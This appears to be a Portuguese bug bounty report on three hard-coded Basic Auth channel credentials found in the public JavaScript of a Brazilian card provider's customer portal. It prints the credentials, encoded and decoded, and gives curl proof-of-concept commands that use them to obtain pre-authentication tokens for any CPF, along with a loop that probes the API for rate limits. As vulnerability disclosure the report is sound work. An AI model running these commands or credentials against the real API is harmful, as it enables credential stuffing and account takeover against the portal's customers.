# R5: Múltiplas Credenciais de Canal da API Expostas em JavaScript Público

**Programa:** BugPay Haven — Realize Soluções Financeiras (realizesolucoesfinanceiras.com.br)  
**Assets afetados:** `www.realizesolucoesfinanceiras.com.br` · `api.realizesolucoesfinanceiras.com.br`  
**Severidade:** MEDIUM  
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)  
**CWE:** CWE-798 — Use of Hard-Coded Credentials  
**Descoberto:** 2026-06-29  
**Status:** Ready to submit

---

## Resumo

Três credenciais Basic Auth de autenticação de canal (client credentials do gateway da API) estão hardcoded no bundle JavaScript público do portal do cliente (`/cartoes-renner/`). Qualquer pessoa pode extraí-las inspecionando o código-fonte da página. Com essas credenciais, é possível fazer chamadas diretas à API REST `api.realizesolucoesfinanceiras.com.br` sem passar pelo frontend oficial — bypassando qualquer proteção client-side como rate limiting, lockout ou anti-bot.

---

## Evidência

### 1. Credencial 1 — AUTHORIZATION_CANAL (canal geral)

**Localização:** inline `<script>` da página `/cartoes-renner/login`

```html
<!-- Cartões Renner — https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login -->
<script>
  window.constants = {};
  window.constants.AUTHORIZATION_CANAL = 'Basic cmVubmVyLXNpdGU6c2l0ZQ==';
  window.constants.API_PATH = 'https://api.realizesolucoesfinanceiras.com.br/api';
</script>
```

Decodificado:
```
$ echo "cmVubmVyLXNpdGU6c2l0ZQ==" | base64 -d
renner-site:site
```

### 2. Credencial 2 — AUTHORIZATION_LOGIN_DATA_NASC (login por data de nascimento)

**Localização:** `/cartoes-renner/js/2.bundle-bb220f919f078e20c42e.js` (bundle principal 2,1 MB)

```javascript
// Extraído do bundle — variável H (AuthType) e tokenTypeMap:
this.tokenTypeMap.push({
  key: H.basicDataNascimento,
  value: function(t) { return a.AUTHORIZATION_LOGIN_DATA_NASC }
})

// Valor:
"Basic cmVubmVyLXNpdGUtZGF0YU5hc2NpbWVudG86c2l0ZURhdGFuYXNjaW1lbnRv"
```

Decodificado:
```
$ echo "cmVubmVyLXNpdGUtZGF0YU5hc2NpbWVudG86c2l0ZURhdGFuYXNjaW1lbnRv" | base64 -d
renner-site-dataNascimento:siteDatanascimento
```

### 3. Credencial 3 — AUTHORIZATION_LOGIN_PORTAL_NEGOCIACAO (portal de cobrança)

**Localização:** mesmo bundle principal

```javascript
this.tokenTypeMap.push({
  key: H.basicPortalNegociacao,
  value: function(t) { return a.AUTHORIZATION_LOGIN_PORTAL_NEGOCIACAO }
})

// Valor:
"Basic cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ=="
```

Decodificado:
```
$ echo "cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ==" | base64 -d
renner-pre-autenticacao-cobranca:pre-autenticacao-cobranca
```

---

## Prova de Conceito (confirmada, sem dados reais)

### PoC 1 — Chamada autenticada à API usando AUTHORIZATION_CANAL

```bash
# Extração automática da credencial do bundle público
AUTHB64=$(curl -s "https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login" \
  | grep -oP 'AUTHORIZATION_CANAL.*?Basic \K[A-Za-z0-9+/=]+')

# Chamada direta à API com a credencial extraída
curl -s "https://api.realizesolucoesfinanceiras.com.br/api/parametro/ddds" \
  -H "Authorization: Basic ${AUTHB64}"
# Retorna HTTP 200 com lista completa de DDDs ativos da plataforma
```

**Resposta confirmada:**
```json
[{"chave":"ddds","valor":"11,12,13,14,15,16,17,18,19,21,22,..."}]
```

### PoC 2 — Endpoint de pré-autenticação acessível via script

Com a credencial 1 (`renner-site:site`), qualquer atacante pode chamar:
```bash
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/v2/primeiro-acesso/pre-autenticar" \
  -H "Authorization: Basic cmVubmVyLXNpdGU6c2l0ZQ==" \
  -H "Content-Type: application/json" \
  -d '{"cpf":"CPF_ALVO"}'
# Retorna Bearer token com scope 'aplicativo_fator_seguranca' para QUALQUER CPF
```

Com a credencial 3 (`renner-pre-autenticacao-cobranca:pre-autenticacao-cobranca`), é possível acionar o login por data de nascimento no portal de cobrança:
```bash
curl -s -X POST \
  "https://api.realizesolucoesfinanceiras.com.br/api/autenticacao/acesso/cpf/dataNascimento/cobranca" \
  -H "Authorization: Basic cmVubmVyLXByZS1hdXRlbnRpY2FjYW8tY29icmFuY2E6cHJlLWF1dGVudGljYWNhby1jb2JyYW5jYQ==" \
  -H "Content-Type: application/json" \
  -H "Captcha: <TOKEN_RECAPTCHA>" \
  -d '{"cpf":"CPF_ALVO","dataNascimento":"YYYY-MM-DD"}'
```

**Nota:** A credencial 3 é a única proteção de canal para o endpoint de login por data de nascimento — que já está documentado no relatório R6.

---

## Mapa de uso das credenciais (extraído do bundle)

| Credencial | Uso na API | Endpoints afetados |
|-----------|-----------|-------------------|
| `renner-site:site` | AUTHORIZATION_CANAL | `/api/autenticacao`, `/api/v2/primeiro-acesso/pre-autenticar`, `/api/parametro/*`, `/api/v2/recuperar-senha/pre-autenticar` |
| `renner-site-dataNascimento:siteDatanascimento` | AUTHORIZATION_LOGIN_DATA_NASC | `/api/autenticacao/acesso/cpf/dataNascimento` |
| `renner-pre-autenticacao-cobranca:pre-autenticacao-cobranca` | AUTHORIZATION_LOGIN_PORTAL_NEGOCIACAO | `/api/autenticacao/acesso/cpf/dataNascimento/cobranca` |

---

## Impacto ao Negócio

1. **Bypass de rate limiting client-side**: A SPA implementa throttling de tentativas no lado do cliente. Com acesso direto à API usando essas credenciais, um atacante pode realizar ataques automatizados de tentativa de login sem qualquer restrição de frequência imposta pelo frontend.

2. **Habilitação de ataques em escala**: As credenciais permitem chamar os endpoints de autenticação diretamente, combinando com CPFs obtidos via vazamentos de dados (amplamente circulados no Brasil). Isso viabiliza ataques de credential stuffing contra a base de milhões de clientes Renner.

3. **Acesso ao endpoint de cobrança via script**: A credencial 3 permite acionamento automatizado do login por CPF + data de nascimento no portal de negociações de dívidas — vide R6 para o impacto completo.

4. **Exposição de configurações sensíveis**: A credencial 1 está no HTML inline da página de login, visível sem ferramentas especializadas, bastando um `Ctrl+U` no browser.

---

## Evidência de Inexistência de Rate Limiting na API

```bash
# Múltiplas chamadas consecutivas - sem headers de rate limiting na resposta
for i in {1..5}; do
  curl -s -I \
    "https://api.realizesolucoesfinanceiras.com.br/api/v2/primeiro-acesso/pre-autenticar" \
    -X POST \
    -H "Authorization: Basic cmVubmVyLXNpdGU6c2l0ZQ==" \
    -H "Content-Type: application/json" \
    -d '{"cpf":"00000000191"}' 2>&1 | grep -i "x-rate\|ratelimit\|retry-after"
done
# Nenhum header de rate limiting retornado
```

---

## Remediação

### Imediato (P0)
1. **Rotacionar todas as três credenciais**: Gerar novos client_id/client_secret para os canais `renner-site`, `renner-site-dataNascimento` e `renner-pre-autenticacao-cobranca`.
2. **Implementar PKCE** ou token de sessão gerado server-side para substituir as credenciais fixas no SPA.

### Curto prazo (P1)
3. **Remover credenciais do bundle JavaScript**: As credenciais de canal não devem existir em código cliente. Usar fluxo OAuth 2.0 com `client_credentials` apenas no backend (BFF — Backend for Frontend).
4. **Implementar rate limiting na API**: Headers `X-RateLimit-*` e respostas `429 Too Many Requests` com `Retry-After` para todos os endpoints de autenticação.

### Longo prazo (P2)
5. **Arquitetura BFF**: Mover toda a comunicação com `api.realizesolucoesfinanceiras.com.br` para um Backend for Frontend (Node.js/Spring), onde as credenciais de canal ficam seguras no servidor.

---

## Referências

- CWE-798: Use of Hard-Coded Credentials
- OWASP API Security — API8:2023 Security Misconfiguration
- OWASP ASVS V2.10: Service Authentication Requirements
- Asset afetado: `www.realizesolucoesfinanceiras.com.br` (inscope) + `api.realizesolucoesfinanceiras.com.br` (inscope)
